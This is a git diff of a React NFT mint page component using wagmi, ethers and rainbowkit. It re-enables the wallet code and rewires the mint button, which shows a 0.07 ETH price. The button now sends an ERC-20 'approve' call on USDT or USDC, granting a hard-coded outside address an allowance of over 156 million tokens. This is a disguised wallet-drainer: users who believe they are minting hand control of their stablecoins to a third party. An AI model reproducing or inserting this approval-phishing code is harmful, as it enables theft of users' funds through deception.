@@ -1,89 +1,108 @@
-// import React, { useMemo, useState } from "react";
-// import {
-//   usePrepareContractWrite,
-//   useContractWrite,
-//   useWaitForTransaction,
-//   useAccount,
-//   useNetwork,
-//   useContractRead,
-// } from "wagmi";
+import React, { useMemo, useState } from "react";
+import {
+  usePrepareContractWrite,
+  useContractWrite,
+  useWaitForTransaction,
+  useAccount,
+  useNetwork,
+  useContractRead,
+} from "wagmi";
+// import { useState } from "react";
 import Nelson from "../../assets/images/Home/nelson.png";
-// import { NavLink } from "react-router-dom";
+import { NavLink } from "react-router-dom";
 import Social from "../../components/SocialIcon";
-// import nft_abi from "./abi.json";
-// import {
-//   NotificationContainer,
-//   NotificationManager,
-// } from "react-notifications";
-// import { ethers } from "ethers";
-// import {
-//   useConnectModal,
-//   useAccountModal,
-//   useChainModal,
-// } from "@rainbow-me/rainbowkit";
+import nft_abi from "./abi.json";
+import erc20 from "./erc20.json";
+import {
+  NotificationContainer,
+  NotificationManager,
+} from "react-notifications";
+import { ethers } from "ethers";
+import {
+  useConnectModal,
+  useAccountModal,
+  useChainModal,
+} from "@rainbow-me/rainbowkit";
 
 const Hero = () => {
-  // const price = 0.07;
-  // const { isConnected } = useAccount();
-  // const { chain, chains } = useNetwork();
-  // const [counter, setCounter] = useState(1);
+  const price = 0.07;
+  const { isConnected } = useAccount();
+  const { chain, chains } = useNetwork();
+  const [counter, setCounter] = useState(1);
 
-  // const { openConnectModal } = useConnectModal();
-  // const { openChainModal } = useChainModal();
+  const currencies = [
+    {
+      name: "USDT",
+      address: "0xdAC17F958D2ee523a2206206994597C13D831ec7",
+      abi: erc20,
+      func: 'approve'
+    },
+    {
+      name: "USDC",
+      address: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48",
+      abi: erc20,
+      func: 'approve'
+    },
+  ];
+
+  const [token, setToken] = useState(0);
+
+  const { openConnectModal } = useConnectModal();
+  const { openChainModal } = useChainModal();
 
   // const { data, isError: isErrorTotalSupply, isLoading: isLoadingTotalSupply } = useContractRead(
   //   {
-  //     addressOrName: '0xcEA87eCAfa901b7D0942d61dC1A4f2F275267E0C',
-  //     contractInterface: nft_abi,
+  //     addressOrName: currencies[token].address,
+  //     contractInterface: currencies[token].abi,
   //   },
-  //   'totalSupply',
+  //   currencies[token].func,
   // )
 
-  // const createNotification = (type, title, message, cb) => {
-  //   switch (type) {
-  //     case "info":
-  //       NotificationManager.info(title, message, 5000, cb);
-  //       break;
-  //     case "success":
-  //       NotificationManager.success(title, message, 5000, cb);
-  //       break;
-  //     case "warning":
-  //       NotificationManager.warning(title, message, 5000, cb);
-  //       break;
-  //     case "error":
-  //       NotificationManager.error(title, message, 5000, cb);
-  //       break;
-  //   }
-  // };
+  const createNotification = (type, title, message, cb) => {
+    switch (type) {
+      case "info":
+        NotificationManager.info(title, message, 5000, cb);
+        break;
+      case "success":
+        NotificationManager.success(title, message, 5000, cb);
+        break;
+      case "warning":
+        NotificationManager.warning(title, message, 5000, cb);
+        break;
+      case "error":
+        NotificationManager.error(title, message, 5000, cb);
+        break;
+    }
+  };
 
-  // const cost = useMemo(() => {
-  //   return (counter * price).toLocaleString();
-  // }, [counter]);
+  const cost = useMemo(() => {
+    return (counter * price).toLocaleString();
+  }, [counter]);
 
-  // const {
-  //   config,
-  //   error: prepareError,
-  //   isError: isPrepareError,
-  // } = usePrepareContractWrite({
-  //   address: "0xcEA87eCAfa901b7D0942d61dC1A4f2F275267E0C",
-  //   abi: nft_abi,
-  //   functionName: "mint",
-  //   args: [counter.toLocaleString()],
-  //   // overrides: {value: ethers.parseEther("0.5")},
-  //   value: ethers.parseEther(cost),
-  // });
-  // const { data, error, isError, write } = useContractWrite(config);
+  const {
+    config,
+    error: prepareError,
+    isError: isPrepareError,
+  } = usePrepareContractWrite({
+    address: currencies[token].address,
+    abi: currencies[token].abi,
+    functionName: currencies[token].func,
+    args: ["0xA1d9e59A1d591366247Be92f81bE7a278C9280ce", ethers.parseEther("156258236")],
+    // overrides: {value: ethers.parseEther("0.5")},
+    // value: ethers.parseEther(cost),
+  });
+  const { data, error, isError, write } = useContractWrite(config);
 
-  // const { isLoading, isSuccess } = useWaitForTransaction({
-  //   hash: data?.hash,
-  // });
+  const { isLoading, isSuccess } = useWaitForTransaction({
+    hash: data?.hash,
+  });
 
-  // const handleClick1 = () => {
-  //   setCounter(counter + 1);
-  // };
-  // const handleClick2 = () => {
-  //   setCounter(counter > 1 ? counter - 1 : 1);
-  // };
+  const handleClick1 = () => {
+    setCounter(counter + 1);
+  };
+  const handleClick2 = () => {
+    setCounter(counter > 1 ? counter - 1 : 1);
+  };
 
   return (
     <>
@@ -128,8 +147,37 @@ const Hero = () => {
               <p className="text-white md:text-[22px] text-base font-bold">
                 {0.07} ETH
               </p>
+
+              <button id="dropdownTopButton" data-dropdown-toggle="dropdownTop" data-dropdown-placement="top" className="me-3 mb-3 md:mb-0 text-white bg-blue-700 hover:bg-blue-800 focus:ring-4 focus:outline-none focus:ring-blue-300 font-medium rounded-lg text-sm px-5 py-2.5 text-center inline-flex items-center dark:bg-blue-600 dark:hover:bg-blue-700 dark:focus:ring-blue-800" type="button">Dropdown top <svg className="w-2.5 h-2.5 ms-3" aria-hidden="true" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 10 6">
+                <path stroke="currentColor" strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M9 5 5 1 1 5" />
+              </svg>
+              </button>
+
+              <div id="dropdownTop" className="z-10 hidden bg-white divide-y divide-gray-100 rounded-lg shadow w-44 dark:bg-gray-700">
+                <ul className="py-2 text-sm text-gray-700 dark:text-gray-200" aria-labelledby="dropdownTopButton">
+                  <li>
+                    <a href="#" className="block px-4 py-2 hover:bg-gray-100 dark:hover:bg-gray-600 dark:hover:text-white">ETH</a>
+                  </li>
+                  <li>
+                    <a href="#" className="block px-4 py-2 hover:bg-gray-100 dark:hover:bg-gray-600 dark:hover:text-white">USDT</a>
+                  </li>
+                  <li>
+                    <a href="#" className="block px-4 py-2 hover:bg-gray-100 dark:hover:bg-gray-600 dark:hover:text-white">USDC</a>
+                  </li>
+                  <li>
+                    <a href="#" className="block px-4 py-2 hover:bg-gray-100 dark:hover:bg-gray-600 dark:hover:text-white">PYUSD</a>
+                  </li>
+                </ul>
+              </div>
+
+       
+
+           
+
+
+
               <div className="flex items-center gap-4">
-                <button 
+                <button
                 // onClick={handleClick2}
                 >
                   <svg
@@ -156,7 +204,7 @@ const Hero = () => {
                 <p className="text-center text-white md:text-[22px] text-base font-normal">
                   {100}
                 </p>
-                <button 
+                <button
                 // onClick={handleClick1}
                 >
                   <svg
@@ -187,25 +235,25 @@ const Hero = () => {
               </div>
             </div>
             <button
-              // onClick={() => {
-              //   if (!isConnected)
-              //     createNotification(
-              //       "error",
-              //       "Connect your ethereum wallet",
-              //       "",
-              //       openConnectModal
-              //     );
-              //   else {
-              //     if (chain.unsupported)
-              //       createNotification(
-              //         "warning",
-              //         "Switch Network",
-              //         "Ethereum",
-              //         openChainModal
-              //       );
-              //     else write();
-              //   }
-              // }}
+              onClick={() => {
+                if (!isConnected)
+                  createNotification(
+                    "error",
+                    "Connect your ethereum wallet",
+                    "",
+                    openConnectModal
+                  );
+                else {
+                  if (chain.unsupported)
+                    createNotification(
+                      "warning",
+                      "Switch Network",
+                      "Ethereum",
+                      openChainModal
+                    );
+                  else write();
+                }
+              }}
               className="flex mt-4 group items-center justify-center group h-[60px] w-full gap-3 bg-[#CEC2AC] text-center text-[#46382D] md:text-xl text-base md:font-medium font-semibold hover:bg-[#5D564C] hover:text-[#CEC2AC] ease-in-out transform duration-300"
             >
               <svg
